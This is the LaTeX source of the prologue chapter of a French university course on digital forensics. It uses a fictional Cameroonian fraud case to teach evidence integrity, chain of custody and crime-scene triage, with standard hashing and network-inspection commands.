% ============================================================================
% Fichier     : TPIN_main.tex
% Titre       : Théorie et Pratique de l'Investigation Numérique
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Institution : Université de Yaoundé I — ENSP / LIMSI
% Unité       : Département de Génie Informatique
% Code UE     : 
% Version     : 2.0 — Année académique 2025–2026
%
% COMPILATION :
%   pdflatex TPIN_main.tex
%   biber    TPIN_main
%   makeindex TPIN_main.idx
%   pdflatex TPIN_main.tex  (x2 pour ToC et références croisées)
%
% ORGANISATION DES FICHIERS :
%   TPIN_main.tex          — ce fichier (orchestrateur)
%   Style_IN.sty           — feuille de style unifiée
%   bibliographie/         — fichier(s) .bib
%   front/                 — page de titre, avant-propos, remerciements
%   partie0/               — Prologue opérationnel
%   partie1/               — Fondements épistémologiques et historiques
%   partie2/               — Processus et méthodologies d'investigation
%   partie3/               — Cadre normatif, judiciaire et déontologique
%   partie4/               — Forensique opérationnelle (système, réseau, mobile)
%   partie5/               — Anti-forensique, contre-mesures, IA forensique
%   partie6/               — Crypto-forensique et innovations (CRO, ZK-NR)
%   annexes/               — Glossaire, outils, templates, bibliographie, contacts
% ============================================================================

\documentclass[12pt, twoside, openright, a4paper]{book}

% --- Feuille de style unifiée ---
\usepackage{Style_IN}

% --- Bibliographie ---
\addbibresource{bibliographie/TPIN_references.bib}

% ============================================================================
% MÉTADONNÉES PDF
% ============================================================================
\hypersetup{
    pdftitle={Théorie et Pratique de l'Investigation Numérique},
    pdfauthor={MINKA MI NGUIDJOÏ Thierry Emmanuel},
    pdfsubject={GES4062 — Génie Informatique — ENSP Yaoundé I},
    pdfkeywords={investigation numérique, forensique, Trilemme CRO, ZK-NR,
                 cryptographie post-quantique, droit camerounais, TPIN}
}

% ============================================================================
% DÉBUT DU DOCUMENT
% ============================================================================
\begin{document}

% --------------------------------------------------------------------------
% ÉLÉMENTS PRÉLIMINAIRES (pages romaines)
% --------------------------------------------------------------------------
\frontmatter

    \input{front/00_page_titre}
    \cleardoublepage

    \input{front/01_avant_propos}
    \cleardoublepage

    \input{front/02_mode_emploi}
    \cleardoublepage

    \tableofcontents
    \cleardoublepage

    \listoffigures
    \listoftables
    \cleardoublepage

% --------------------------------------------------------------------------
% CORPS DU COURS (pages arabes)
% --------------------------------------------------------------------------
\mainmatter

    % ======================================================================
    % PARTIE 0 — PROLOGUE OPÉRATIONNEL
    % « Avant toute théorie, une scène de crime »
    % But : créer l'urgence pédagogique dès la première page.
    % Niveau : introductif — aucun prérequis.
    % ======================================================================
    \part{Prologue Opérationnel}
    \label{part:prologue}

        % ============================================================================
% Fichier  : partie0/P00_scene_crime_numerique.tex
% Titre    : Prologue -- Scène de Crime Numérique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
%
% Objectif pédagogique :
%   Créer l'urgence pédagogique dès la première page. L'étudiant comprend,
%   avant toute théorie, qu'une seule erreur procédurale annule des semaines
%   de travail technique. Le cas MBONGO sert de fil rouge immersif.
%   Les 4 principes fondamentaux sont posés ici dans leur forme la plus brute.
%   Le Trilemme CRO est introduit de façon opérationnelle.
% ============================================================================

\chapter{Prologue --- Scène de Crime Numérique}
\label{chap:prologue}

\epigraph{%
    « Un dossier judiciaire ne se perd jamais au tribunal.\\
    Il se perd sur la scène de crime, dans les dix premières minutes. »%
}{--- Adapté de la pratique forensique}

\niveauChapitre{Introductif}{%
    Aucun prérequis technique. Ce prologue se lit avant même d'ouvrir un
    terminal ou de brancher un disque dur.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre, à travers un cas concret, pourquoi la méthode prime
          sur la technique en investigation numérique.
    \item Identifier les quatre principes fondamentaux --- intégrité,
          traçabilité, reproductibilité, admissibilité --- et reconnaître
          une violation de chacun d'eux.
    \item Mémoriser les réflexes immédiats sur une scène de crime numérique
          (PC allumé, PC éteint, téléphone) avant toute manipulation.
    \item Saisir la nature du \termecle{Trilemme CRO} comme tension
          constitutive de toute investigation numérique.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Avant de commencer : une affaire qui n'aurait pas dû échouer}
% ============================================================================

Douala, mars~2026. Le tribunal de grande instance vient de rendre son verdict
dans l'affaire MBONGO\footnote{Les noms, dates et montants de ce cas sont
fictifs mais les mécanismes juridiques et techniques sont rigoureusement
exacts.}. Joseph MBONGO, comptable d'une PME de la Zone Industrielle de
Bassa, était accusé d'avoir détourné \textbf{12~millions de francs CFA} via
des virements frauduleux depuis le compte de son employeur vers un compte
tiers. Les preuves semblaient accablantes : un email de virement portant sa
signature, des captures d'écran du portail bancaire UBA sur son ordinateur,
un historique de navigation Chrome daté et horodaté, un fichier Word supprimé
nommé \texttt{faux\_bon\_de\_commande.docx}.

\medskip

L'avocat de la défense a demandé la parole. En dix minutes, il a obtenu
l'irrecevabilité de la totalité des preuves numériques. Le dossier s'est
effondré.

\begin{boxalert}
\textbf{Pourquoi ?} L'OPJ chargé de la saisie avait, en arrivant sur place,
\emph{allumé} l'ordinateur pour « constater visuellement les faits ». Windows
avait automatiquement monté toutes les partitions, mis à jour les horodatages
d'accès, créé des fichiers temporaires, modifié des clés de registre. L'avocat
a prouvé au juge que l'heure de « création » de la capture d'écran
\texttt{ecran\_virement.png}, telle que lue dans Autopsy, était
\textbf{postérieure} à l'heure de saisie déclarée dans le procès-verbal.
Contamination prouvée. Irrecevabilité prononcée.

L'OPJ avait pourtant fait \emph{tout le reste} correctement~: il avait utilisé
Autopsy, calculé les hash, rédigé un rapport de 40~pages. Tout cela est devenu
sans valeur à cause de \textbf{dix secondes d'inattention} au moment d'appuyer
sur le bouton Power.
\end{boxalert}

\medskip

Ce prologue n'est pas là pour vous enseigner Autopsy, ni le protocole TCP/IP,
ni la cryptographie post-quantique. Ces sujets occupent les 600~pages qui
suivent. Ce prologue est là pour vous enseigner \textbf{le réflexe fondateur
de toute la discipline}~: \emph{avant d'agir, comprendre ce que votre action
va détruire}.

\separateur

% ============================================================================
\section{La Scène de Crime Numérique : un Lieu à Sécuriser}
% ============================================================================

\subsection{Ce qui change par rapport à une scène physique}

Un investigateur criminaliste traditionnel sait qu'il ne doit pas marcher
sur les traces de pas, ni toucher l'arme sans gants. L'équivalent numérique
de cette règle est moins intuitif, parce que la contamination y est
\textbf{invisible}. Brancher un clavier, allumer un écran, ouvrir un
fichier~: chacune de ces actions laisse des traces qui modifient l'état
de la scène.

\begin{boxdef}
\textbf{Scène de crime numérique}\index{scène de crime numérique} --- Tout
environnement numérique susceptible de contenir des traces probantes d'un
acte délictueux. Elle inclut les supports physiques (disques durs, clés USB,
téléphones), la mémoire volatile (RAM), le trafic réseau, les journaux
de serveurs et les données stockées dans le nuage.
\end{boxdef}

La différence essentielle avec une scène physique est la
\termecle{volatilité}~: certaines données disparaissent en quelques
secondes (mémoire vive), d'autres en quelques minutes (connexions réseau),
d'autres subsistent mais peuvent être altérées sans laisser de trace
visible à l'~il nu (horodatages de fichiers).

\begin{tableaucours}{p{3.5cm}p{3.8cm}p{4.5cm}}{%
    \tableauHeader{Type de donnée} &
    \tableauHeader{Durée de vie} &
    \tableauHeader{Menace principale}
}
Registres CPU, cache & Nanosecondes & Non capturable \\
Mémoire RAM & Jusqu'à extinction & Extinction non planifiée \\
Connexions réseau actives & Secondes à minutes & Déconnexion réseau \\
Fichiers ouverts, sessions & Minutes & Fermeture de session \\
Disque dur / SSD & Mois à années & Chiffrement, TRIM \\
Journaux de serveur & Jours à semaines & Rotation automatique \\
Données cloud & Indéfini & Suppression distante \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~P.1 --- Ordre de volatilité des données numériques
(d'après RFC~3227 \cite{rfc3227})}\end{center}

\subsection{Le paradoxe de l'observation}

En physique quantique, le principe d'Heisenberg stipule que l'acte de mesurer
une particule modifie son état. L'investigation numérique connaît un paradoxe
analogue~: \textbf{tout acte d'observation d'un système numérique en cours
d'exécution le modifie}. Lancer un outil forensique sur un PC allumé écrit
dans la RAM, crée des fichiers temporaires, génère des entrées dans les
journaux système.

Ce paradoxe ne constitue pas une impasse --- il se gère par la
\textbf{documentation rigoureuse}~: l'investigateur note précisément chaque
action entreprise et chaque modification connue qu'elle a induite. Le tribunal
peut alors distinguer les traces \emph{antérieures} à l'investigation des
traces \emph{créées par} l'investigation.

\begin{boxinfo}
\textbf{La règle d'or~:} toute modification introduite pendant l'investigation
doit être \emph{documentée}, \emph{justifiée} et \emph{minimisée}. L'objectif
n'est pas la perfection impossible, mais la traçabilité complète.
\end{boxinfo}

% ============================================================================
\section{Les Quatre Principes Fondamentaux}
% ============================================================================

Ces quatre principes structurent l'intégralité de la discipline. Ils seront
formalisés mathématiquement dans la Partie~II, mais les voici dans leur
formulation la plus directe, illustrée par des violations réelles.

\subsection{Principe 1 --- Intégrité}
\label{subsec:principe-integrite}

\begin{boxdef}
\textbf{Intégrité}\index{intégrité!preuve numérique} (\textit{Integrity}) ---
Garantie que la preuve numérique n'a pas été modifiée depuis sa collecte.
Elle se démontre par la correspondance des \termecle{empreintes
cryptographiques} calculées avant et après acquisition.
\end{boxdef}

L'intégrité est prouvée \textbf{mathématiquement}, pas déclarativement.
Il ne suffit pas d'affirmer « je n'ai rien touché »~; il faut que le
\termecle{hash} de l'image forensique soit bit-à-bit identique au hash du
support original.

\begin{boxalert}
\textbf{Violation typique.} Un enquêteur branche un disque dur suspect
directement sur son ordinateur Windows sans \textit{write blocker}. Windows
monte la partition, met à jour les horodatages d'accès du système de fichiers
NTFS, crée un répertoire \texttt{System Volume Information}. Le hash du disque
après branchement diffère du hash avant branchement. La preuve est contaminée.

\smallskip
\textbf{Règle absolue~:} ne jamais monter un support suspect sans
\termecle{write blocker} matériel ou logiciel activé et vérifié.
\end{boxalert}

La vérification d'intégrité repose sur des fonctions de hachage
cryptographiques. Les commandes de référence~:

\begin{lstlisting}[language=bash_forensique,
    caption={Calcul et vérification d'empreintes cryptographiques}]
# Windows (CMD) -- calcul MD5 et SHA-256
certutil -hashfile C:\evidence\disque.E01 MD5
certutil -hashfile C:\evidence\disque.E01 SHA256

# Windows (PowerShell) -- alternative recommandée
Get-FileHash C:\evidence\disque.E01 -Algorithm SHA256

# Linux / Kali Linux -- syntaxe native
md5sum    /evidence/disque.E01
sha256sum /evidence/disque.E01
\end{lstlisting}

Les deux hash --- source et image --- doivent être \textbf{identiques} et
\textbf{documentés} dans le formulaire de chaîne de custody \emph{avant}
toute analyse.

\begin{boiteRemarque}{MD5 ou SHA-256 ?}
MD5 (128~bits) reste accepté en forensique pour l'intégrité d'une image
car le risque n'est pas la falsification intentionnelle mais l'altération
accidentelle. SHA-256 (256~bits) est recommandé pour toutes les nouvelles
investigations et exigé en contexte à haute valeur probatoire. Calculez
\emph{toujours les deux simultanément} et documentez les deux dans le
formulaire de custody.
\end{boiteRemarque}

\subsection{Principe 2 --- Traçabilité (chaîne de custody)}
\label{subsec:principe-tracabilite}

\begin{boxdef}
\termecle{Chaîne de custody}\index{chaîne de custody} (\textit{Chain of
custody}) --- Registre chronologique documentant chaque personne ayant eu
accès à une preuve et toutes les actions effectuées sur celle-ci, depuis
sa collecte jusqu'à sa présentation en audience.
\end{boxdef}

La chaîne de custody est le \textbf{document le plus important d'une
investigation numérique} --- plus important que le rapport technique
lui-même. Un rapport d'analyse de 100~pages perd toute valeur si on ne peut
prouver que l'evidence analysée est bien celle saisie sur la scène de crime.

\begin{boxcustody}
\textbf{Le formulaire commence au premier contact.}
Les informations minimales à consigner immédiatement~:
\begin{enumerate}
    \item Numéro de dossier et numéro d'evidence (\textit{ex.}~: DOS-2026-004 / EV-001)
    \item Description physique précise~: marque, modèle, numéro de série,
          couleur, état apparent (rayures, caches manquants)
    \item Lieu, date et heure de collecte (\texttt{JJ/MM/AAAA HH:MM})
    \item Nom, grade et matricule du collecteur
    \item \hash{MD5}{} et \hash{SHA-256}{} du support original (avant acquisition)
    \item \hash{MD5}{} et \hash{SHA-256}{} de l'image forensique (après acquisition)
    \item Confirmation explicite que les deux hash correspondent
\end{enumerate}
Le formulaire complet est disponible en Annexe~C.
\end{boxcustody}

\begin{boxalert}
\textbf{Violation typique.} Un OPJ saisit le téléphone d'un suspect et le
confie à un collègue pendant une heure pour « garder un \oe il dessus ».
Ce transfert non documenté constitue un vide dans la chaîne de custody.
À l'audience, l'avocat peut semer le doute~: le téléphone a-t-il été
manipulé pendant cette heure ?

\textbf{Règle~:} tout transfert d'une evidence entre deux personnes doit
être documenté immédiatement --- date, heure, raison, signatures des deux
parties. Si un doute existe, l'intégrité doit être re-vérifiée par re-hashage.
\end{boxalert}

\begin{boxjuris}
\textbf{Droit camerounais --- \loicam{2010/012}, article~53, alinéa~1~:}

\medskip
\textit{« Les perquisitions \textelp{} peuvent porter sur des copies réalisées
en présence des personnes qui assistent à la perquisition. »}

\medskip
Cet article établit l'exigence légale d'une copie forensique réalisée
\emph{en présence} des parties. Le formulaire de chaîne de custody est la
traduction procédurale de cette exigence~: il prouve que la copie a été
réalisée de façon transparente et documentée. Son absence peut suffire à
faire rejeter l'ensemble du dossier numérique.
\end{boxjuris}

\subsection{Principe 3 --- Reproductibilité}
\label{subsec:principe-reproductibilite}

\begin{boxdef}
\textbf{Reproductibilité}\index{reproductibilité} (\textit{Reproducibility}) ---
Propriété d'une méthode d'investigation telle que, si elle est appliquée
par un autre investigateur qualifié sur la même evidence avec les mêmes
outils, elle produit les mêmes résultats.
\end{boxdef}

La reproductibilité est la \textbf{condition de scientificité} de
l'investigation numérique. Un résultat que seul son auteur peut obtenir,
avec un outil non documenté, selon une méthode non explicitée, n'est pas
une preuve scientifique~: c'est une opinion.

En pratique, trois exigences concrètes s'imposent~:

\begin{enumerate}
    \item \textbf{Nommer les outils avec précision~:} nom, version exacte,
          système d'exploitation hôte. \textit{« Analysé avec Autopsy »}
          est insuffisant. La formulation correcte est~: \textit{« Autopsy
          4.21.0 (The Sleuth Kit 4.12.0) sur Windows~11 Pro~22H2. »}

    \item \textbf{Décrire la méthode~:} les étapes dans leur ordre exact,
          suffisamment détaillées pour qu'un pair puisse les reproduire
          indépendamment.

    \item \textbf{Documenter les limites~:} ce qui n'a \emph{pas} pu être
          analysé (partition chiffrée, fichier corrompu) doit être
          explicitement mentionné. Un rapport silencieux sur ses propres
          lacunes est un rapport trompeur.
\end{enumerate}

\begin{boxalert}
\textbf{Violation typique.} Un analyste utilise un script Python maison
pour extraire des artefacts de navigation. L'expert adverse tente de
reproduire l'analyse sur la même image --- et obtient des résultats
différents, car le script contient une erreur sur certains formats SQLite.
La méthode n'est pas reproductible. Les conclusions sont invalidées.

\textbf{Règle~:} utiliser des outils validés et documentés (Autopsy,
Volatility, FTK Imager). Documenter la version exacte. Tester tout outil
maison sur des données de référence connues avant utilisation en investigation
réelle.
\end{boxalert}

\subsection{Principe 4 --- Admissibilité}
\label{subsec:principe-admissibilite}

\begin{boxdef}
\textbf{Admissibilité}\index{admissibilité} (\textit{Admissibility}) ---
Qualité d'une preuve numérique lui permettant d'être recevable dans une
procédure judiciaire. Elle suppose que la preuve a été obtenue légalement,
qu'elle est pertinente aux faits allégués, et qu'elle est intègre.
\end{boxdef}

Une preuve techniquement parfaite est sans valeur si elle est juridiquement
irrecevable. L'admissibilité est la \emph{finalité} de tous les autres
principes~: l'intégrité, la traçabilité et la reproductibilité existent
\emph{pour} garantir l'admissibilité.

\begin{boxalert}
\textbf{Violation typique.} Un supérieur hiérarchique accède au poste de
travail d'un employé suspecté avec son propre compte administrateur, copie
les fichiers sur une clé USB personnelle et les remet à la police. Ces
fichiers sont irrecevables~: collecte sans autorisation judiciaire,
procédure de saisie non conforme aux articles~52--59 de la
\loicam{2010/012}.

\textbf{Règle~:} en contexte judiciaire, l'investigation numérique exige
l'autorisation appropriée (mandat de perquisition, réquisition du procureur).
En contexte interne (entreprise), elle doit être encadrée par le règlement
intérieur et respecter le droit du travail camerounais.
\end{boxalert}

\begin{boxjuris}
\textbf{Quatre critères d'admissibilité en droit camerounais}\\
\textit{(d'après la jurisprudence et les articles~52--59 de la \loicam{2010/012})}

\begin{enumerate}
    \item \textbf{Légalité~:} obtenue avec l'autorisation requise par la loi.
    \item \textbf{Pertinence~:} en lien direct avec les faits poursuivis.
    \item \textbf{Intégrité~:} non altérée depuis sa collecte (hachage vérifiable).
    \item \textbf{Authenticité~:} origine prouvable par la chaîne de custody.
\end{enumerate}
\end{boxjuris}

% ============================================================================
\section{Le Trilemme CRO : la Tension Constitutive}
\label{sec:trilemme-intro}
% ============================================================================

Avant d'entrer dans le détail des techniques, il est essentiel de comprendre
la tension profonde qui traverse toute l'investigation numérique. Cette tension
a été formalisée par les travaux du \sigle{LIMSI} sous le nom de
\termecle{Trilemme CRO}\index{Trilemme CRO} \cite{minka2025cro}.

\subsection{Les trois dimensions en opposition}

Toute investigation numérique doit simultanément satisfaire trois exigences
qui se contrarient mutuellement~:

\begin{itemize}
    \item \textbf{$\mathcal{C}$ --- Confidentialité~:} protéger la vie privée
          des personnes impliquées (suspect, victimes, témoins) et les données
          sensibles rencontrées.
    \item \textbf{$\mathcal{R}$ --- Fiabilité~(\textit{Reliability})~:} garantir
          que les preuves sont intègres, authentiques, reproductibles.
    \item \textbf{$\mathcal{O}$ --- Opposabilité juridique~:} assurer que les
          preuves peuvent être présentées et défendues devant un tribunal.
\end{itemize}

\begin{boxCRO}
\textbf{Le Trilemme formulé~:} il est impossible de maximiser simultanément
les trois dimensions.

\medskip
Pour qu'une preuve soit \textbf{opposable} ($\mathcal{O}$ haute), elle doit
être vérifiable par toutes les parties --- ce qui tend à \emph{réduire} la
confidentialité ($\mathcal{C}$ contrainte).

Pour maximiser la \textbf{confidentialité} ($\mathcal{C}$ haute) --- en
chiffrant les données collectées --- on risque de compromettre la
reproductibilité et donc la fiabilité ($\mathcal{R}$ réduite).

Pour garantir la \textbf{fiabilité} ($\mathcal{R}$ haute) --- en collectant
le maximum de données --- on élargit le périmètre et empiète sur la vie
privée de personnes non impliquées ($\mathcal{C}$ réduite).

\[
\Gamma_{CRO}(\Pi) \;=\; \max\bigl\{\mathcal{C}(\Pi),\;
\mathcal{R}(\Pi),\; \mathcal{O}(\Pi)\bigr\}
\;\geq\; 0.4 + \mathrm{negl}(\lambda)
\]

\textit{Toute investigation est un compromis explicite entre ces trois
dimensions. La maîtrise de ce compromis distingue l'investigateur expert
du technicien.}
\end{boxCRO}

\subsection{Le Trilemme sur la scène de crime : exemples immédiats}

Ce n'est pas une abstraction théorique. Dès les premières secondes,
l'investigateur fait face à des choix CRO concrets~:

\begin{itemize}
    \item \textit{Doit-il capturer la RAM ?} Cette capture va légèrement
          modifier la RAM (atteinte à $\mathcal{R}$, documentable et
          acceptable) mais c'est la seule façon d'obtenir les clés de
          chiffrement actives (gain majeur pour $\mathcal{O}$).
          \hfill\cro{$\sim$}{$\downarrow$faible}{$\uparrow$}

    \item \textit{Peut-il lire tous les messages WhatsApp ?} Certains n'ont
          aucun lien avec l'affaire et révèlent la vie privée de tiers
          innocents. Lire plus que nécessaire améliore la fiabilité brute
          mais viole la proportionnalité légale.
          \hfill\cro{$\downarrow$}{$\uparrow$}{$\sim$}

    \item \textit{Doit-il tout documenter publiquement ?} Certains artefacts
          sensibles (données médicales, correspondances protégées) peuvent
          être transmis sous pli scellé au juge. Gain pour $\mathcal{C}$,
          légère contrainte pour $\mathcal{O}$.
          \hfill\cro{$\uparrow$}{$\sim$}{$\downarrow$faible}
\end{itemize}

\medskip

Tout au long de ce cours, chaque technique sera analysée à travers ce prisme.
L'encadré \textbf{Analyse~CRO} apparaîtra systématiquement pour expliciter
quel compromis est réalisé et comment le justifier devant un tribunal.

% ============================================================================
\section{Protocole d'Urgence : les 10 Premières Minutes}
\label{sec:protocole-urgence}
% ============================================================================

Ce protocole synthétise les décisions critiques des dix premières minutes.
Il sera détaillé et justifié dans la Partie~II et la Partie~IV. Il est
présenté ici dans sa forme la plus opérationnelle, pour être applicable
immédiatement.

\subsection{Arrivée sur la scène : les trois questions immédiates}

\begin{enumerate}
    \item \textbf{Le matériel est-il sous tension ?} → La réponse détermine
          tout ce qui suit.
    \item \textbf{Y a-t-il du chiffrement actif visible ?}
          (BitLocker déverrouillé, VeraCrypt monté, Android déverrouillé) →
          Éteindre un support chiffré sans le capturer d'abord peut rendre
          les données définitivement inaccessibles.
    \item \textbf{Y a-t-il une connexion réseau active ?} → Un suspect peut
          encore déclencher une destruction de données à distance tant que
          la connexion est maintenue.
\end{enumerate}

\subsection{PC allumé : procédure de triage}

\begin{boxPNC}
\textbf{PC allumé --- ordre des actions}

\begin{enumerate}
    \item \volatilite{1}{RAM} --- Capturer la mémoire vive avec FTK~Imager
          (\texttt{File → Capture Memory}). Le PC reste allumé pendant
          cette étape.
    \item \volatilite{2}{Écran} --- Photographier l'écran dans son état
          actuel. Ne fermer aucune fenêtre.
    \item \volatilite{3}{Réseau} --- Documenter les connexions actives~:
          \texttt{netstat -ano} (CMD) ou \texttt{Get-NetTCPConnection}
          (PowerShell). Photographier ou noter.
    \item \volatilite{4}{Arrêt} --- Éteindre proprement via le menu Windows.
          Sauf si une destruction de données est imminente, auquel cas
          l'arrachage du câble est justifiable et \emph{doit être documenté}.
    \item \volatilite{5}{Disque} --- Brancher avec write blocker. Acquérir
          l'image E01 avec FTK~Imager. Calculer et noter hash MD5+SHA-256.
\end{enumerate}

\medskip
\textbf{Ne jamais~:} ouvrir un fichier, lancer une application, connecter
un périphérique USB sans write blocker, laisser Windows exécuter une tâche
automatique (mise à jour, indexation).
\end{boxPNC}

\subsection{PC éteint : procédure de saisie}

\begin{boxPNC}
\textbf{PC éteint --- ordre des actions}

\begin{enumerate}
    \item \textbf{Ne pas allumer.} Appuyer sur le bouton Power contamine
          la scène avant même que l'OS ne soit chargé.
    \item Photographier le matériel sous tous les angles, câbles en place,
          avant toute manipulation physique.
    \item Activer le write blocker logiciel ou utiliser un write blocker
          matériel, puis retirer le disque dur ou SSD.
    \item Acquérir l'image forensique en format E01 avec FTK~Imager.
          Documenter les métadonnées du cas (numéro de dossier, examinateur).
    \item Calculer et documenter les hash MD5 et SHA-256 source et image.
    \item Sceller l'evidence originale dans un sachet inviolable étiqueté
          et consigner dans le formulaire de chaîne de custody.
\end{enumerate}
\end{boxPNC}

\subsection{Téléphone mobile : les règles absolues}

\begin{boxPNC}
\textbf{Téléphone mobile --- La règle d'or~: mode avion en premier.}

\medskip
Un téléphone connecté peut recevoir une commande d'effacement à distance
(\textit{remote wipe}) en quelques secondes. Le mode avion coupe la
connexion sans effacer les données.

\medskip
\begin{enumerate}
    \item \textbf{Téléphone allumé~:} mode avion immédiat. Si l'écran est
          inaccessible, placer dans un sac de Faraday\footnote{À défaut de
          sac de Faraday~: plusieurs épaisseurs d'aluminium ménager
          hermétiquement scellées. Vérifier que le signal opérateur disparaît.}.
          Ne jamais brancher sur un chargeur avant isolation électromagnétique.

    \item \textbf{Téléphone éteint, Android, code connu~:} allumer en mode
          avion (maintenir le bouton Power et activer le mode avion dès
          l'affichage du démarrage). Extraire via ADB.

    \item \textbf{Téléphone éteint, chiffré, code inconnu~:} conserver
          éteint. Alimenter la batterie si nécessaire via câble contrôlé.
          Transmettre à un laboratoire spécialisé. N'allumer en aucun cas
          sans stratégie d'extraction préparée au préalable.

    \item \textbf{Documenter~:} numéro IMEI (\texttt{*\#06\#} ou sous la
          batterie), opérateur, état de l'écran, niveau de batterie estimé.
\end{enumerate}
\end{boxPNC}

% ============================================================================
\section{Retour sur l'Affaire MBONGO : ce qui Aurait Dû se Passer}
\label{sec:retour-mbongo}
% ============================================================================

Voici la reconstitution de l'affaire d'ouverture, conduite cette fois
conformément aux quatre principes.

\begin{boxscenario}{Affaire MBONGO --- Version correcte}
\textbf{Situation initiale~:} PC Windows allumé et déverrouillé.
Téléphone Android sur le bureau, écran actif. L'OPJ arrive sur place avec
une clé USB write-protégée contenant FTK~Imager Portable.

\medskip
\begin{enumerate}
    \item \textbf{Photographies d'état} --- L'OPJ photographie l'écran PC
          (fenêtre navigateur ouverte sur le portail bancaire UBA,
          horodatage visible dans la barre des tâches) et l'écran du téléphone.
          Il ne touche ni l'un ni l'autre.

    \item \textbf{Mode avion} sur le téléphone. Consigné dans le formulaire
          (\textit{« 14h37~: téléphone passé en mode avion par OPJ NKENG »}).

    \item \textbf{Capture RAM} --- FTK~Imager Portable lancé depuis la clé
          USB. \texttt{File → Capture Memory}. Fichier \texttt{RAM\_MBONGO.mem}
          sauvegardé sur une clé de destination séparée. Taille~: 16~Go.
          Hash MD5 calculé et noté : \hash{MD5}{a3f7...}.

    \item \textbf{Connexions réseau} --- \texttt{netstat -ano} lancé dans
          CMD. Résultat photographié~: deux connexions ESTABLISHED vers
          l'IP \texttt{41.202.219.X} (UBA~Cameroun) et une connexion vers
          \texttt{185.62.X.X} (inconnue, notée pour investigation ultérieure).

    \item \textbf{Arrêt propre} du PC via le menu Démarrer. Retrait du
          disque dur après déconnexion. Write blocker logiciel activé.
          Acquisition E01 en 47~minutes. Hash source~: \hash{SHA-256}{3d9c...}.
          Hash image~: \hash{SHA-256}{3d9c...}. \textbf{Intégrité vérifiée.}

    \item \textbf{Formulaire de chaîne de custody} rempli pour le PC et le
          téléphone. Sachets scellés. Deux signatures. Transport au dépôt
          de preuves de la Brigade de Cybercriminalité.

    \item \textbf{Analyse sur copie} --- Autopsy~4.21.0 ouvre l'image E01.
          Jamais le disque original. Les 8~artefacts sont identifiés~;
          leurs horodatages sont tous \emph{antérieurs} à la saisie.
\end{enumerate}

\textbf{Résultat~:} à l'audience, l'expert présente les hash correspondants,
le formulaire de custody ininterrompu, la version exacte des outils. L'avocat
de la défense ne peut pas arguer d'une contamination postérieure à la saisie.
Le dossier tient.
\end{boxscenario}

\begin{boxCRO}
\textbf{Analyse CRO --- Affaire MBONGO}

\begin{itemize}
    \item $\mathcal{C}$ --- La capture RAM révèle peut-être des données sans
          rapport avec l'affaire. Ce risque est mentionné dans le rapport~;
          les données non pertinentes ne sont pas incluses dans le dossier.
          \hfill\textit{Compromise acceptable et documentée.}

    \item $\mathcal{R}$ --- La capture RAM modifie légèrement la RAM
          elle-même (le processus FTK y réside pendant l'acquisition).
          Modification connue, quantifiable, minimale. Hash pris
          \emph{après} capture pour refléter cet état.
          \hfill\textit{Maîtrisée.}

    \item $\mathcal{O}$ --- Le hachage, le formulaire de custody et les
          versions d'outils documentés permettent à l'expert de défendre
          chaque artefact devant le juge.
          \hfill\textit{Maximisée.}
\end{itemize}

\cro{$\downarrow$\,acceptable}{$\sim$\,maîtrisé}{$\uparrow$\,maximisé} ---
Configuration standard d'une investigation judiciaire correctement conduite.
\end{boxCRO}

% ============================================================================
\separateur
% ============================================================================

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce prologue~:}

\begin{itemize}
    \item Une investigation numérique peut être techniquement irréprochable
          et juridiquement anéantie par une erreur procédurale commise dans
          les premières minutes.

    \item Les \textbf{quatre principes fondamentaux} structurent toute la
          discipline~: \textbf{intégrité} (hachage MD5+SHA-256),
          \textbf{traçabilité} (chaîne de custody continue),
          \textbf{reproductibilité} (méthodes et outils documentés),
          \textbf{admissibilité} (légalité + pertinence + intégrité).

    \item L'intégrité se prouve \textbf{mathématiquement}, jamais
          déclarativement. Deux hash identiques (source et image) constituent
          la preuve.

    \item La \textbf{chaîne de custody} commence à la seconde où
          l'investigateur touche l'evidence --- pas quand il rédige son rapport.

    \item Le \termecle{Trilemme CRO} formalise la tension irréductible entre
          confidentialité~($\mathcal{C}$), fiabilité~($\mathcal{R}$)
          et opposabilité~($\mathcal{O}$). Toute investigation est un
          compromis explicite et documenté entre ces trois dimensions.

    \item Sur une scène numérique~: \textbf{observer} avant d'agir,
          \textbf{agir dans l'ordre de volatilité}, \textbf{documenter
          chaque geste}.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice P.1 --- Diagnostic d'une violation \niveaubase}]
Lisez la description ci-dessous. Identifiez~: (a)~quel(s) principe(s)
fondamentaux ont été violés~; (b)~quelle dimension du Trilemme CRO a été
sacrifiée~; (c)~ce qu'il aurait fallu faire.

\medskip
\textit{Un chef d'entreprise suspecte un employé de fuite de données
vers un concurrent. Sans prévenir les autorités, il demande à son
informaticien de copier le disque dur de l'employé sur une clé USB
personnelle et de « fouiller les fichiers ». L'informaticien ouvre
les fichiers directement, prend des captures d'écran, et remet la
clé au chef d'entreprise. Trois semaines plus tard, l'entreprise
dépose plainte et présente ces éléments au procureur.}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice P.2 --- Scénario de triage \niveaumoyen}]
Vous arrivez sur une scène avec~:
\begin{itemize}
    \item Un ordinateur portable Windows~11, allumé, écran déverrouillé,
          fenêtre de navigateur ouverte sur un portail bancaire.
    \item Un téléphone Android, allumé, sans code PIN visible, Wi-Fi actif.
    \item Une clé USB branchée sur le laptop, voyant clignotant.
\end{itemize}
Décrivez, dans l'ordre exact des priorités, les six premières actions que
vous effectuez. Pour chaque action, précisez~: le principe fondamental
qu'elle préserve, l'ordre de volatilité auquel elle répond, et l'impact
CRO (\cro{?}{?}{?}).
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice P.3 --- Réflexion CRO \niveauexpert}]
Dans l'affaire MBONGO, l'OPJ a capturé les 16~Go de RAM du PC. Cette RAM
contenait~: les preuves des virements, les identifiants de session bancaire,
\emph{et} 3~Go de correspondances personnelles de MBONGO sans rapport avec
l'affaire (échanges WhatsApp~Web, photos personnelles).

L'avocat de la défense plaide que ces données personnelles n'auraient pas
dû être collectées (violation de la vie privée, article~17 du Pacte
international relatif aux droits civils et politiques, applicable au
